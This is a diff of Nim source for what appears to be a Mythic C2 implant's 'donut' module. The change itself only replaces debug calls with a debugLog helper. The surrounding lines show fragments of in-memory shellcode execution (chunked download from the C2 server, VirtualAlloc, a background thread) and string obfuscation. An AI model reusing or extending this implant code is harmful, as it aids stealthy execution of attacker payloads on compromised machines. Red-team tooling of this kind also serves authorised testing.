@@ -33,8 +33,8 @@ proc donut*(taskId: string, params: JsonNode): JsonNode =
       # Parse full args (uuid required)
       let args = to(params, DonutArgs)
       
-      debug &"[DEBUG] Donut execution: {args.assembly_name}"
-      debug &"[DEBUG] UUID for download: {args.uuid}"
+      debugLog "donut", &"Donut execution: {args.assembly_name}"
+      debugLog "donut", &"UUID for download: {args.uuid}"
       
       # Return initial response - request the file from Mythic
       return %*{
@@ -65,7 +65,7 @@ proc processDonutChunk*(taskId: string, params: JsonNode, chunkData: string,
       for b in decodedChunk:
         fileData.add(cast[byte](b))
       
-      debug &"[DEBUG] Donut: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
+      debugLog "donut", &"Donut: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
       
       # If more chunks remain, request the next one
       if currentChunk < totalChunks:
@@ -221,7 +221,7 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
     try:
       let args = to(params, DonutArgs)
       
-      debug &"[DEBUG] Executing donut shellcode ({shellcode.len} bytes)"
+      debugLog "donut", &"Executing donut shellcode ({shellcode.len} bytes)"
       
       var patchOutput = ""
       
@@ -255,7 +255,7 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
       if shellcode.len == 0:
         return mythicError(taskId, obf("Shellcode is empty - file download may have failed"))
       
-      debug &"[DEBUG] Donut: Allocating {shellcode.len} bytes for shellcode"
+      debugLog "donut", &"Donut: Allocating {shellcode.len} bytes for shellcode"
       
       # Allocate memory
       let pShellcode = VirtualAlloc(
@@ -354,7 +354,7 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
         lastOutputTime: 0.0,
       )
       
-      debug &"[DEBUG] Donut: Thread launched, returning to main loop (timeout: {timeoutSec}s)"
+      debugLog "donut", &"Donut: Thread launched, returning to main loop (timeout: {timeoutSec}s)"
       
       # Return processing status - agent stays responsive
       return mythicProcessing(taskId, patchOutput & obf("Donut shellcode executing in background...\n"))
